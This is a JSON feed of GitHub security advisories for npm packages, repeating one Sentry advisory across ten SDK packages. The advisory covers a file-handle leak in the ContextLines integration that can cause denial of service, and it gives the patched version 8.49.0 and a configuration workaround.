{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/sveltekit] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T20:37:50.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/solidstart] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T20:37:50.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/remix] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T20:37:50.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/nuxt] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T20:37:50.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/nextjs] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T20:37:50.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/nestjs] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T20:37:50.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/google-cloud-serverless] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T20:37:50.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/bun] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T20:37:50.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/aws-serverless] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T20:37:50.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/astro] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T20:37:50.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
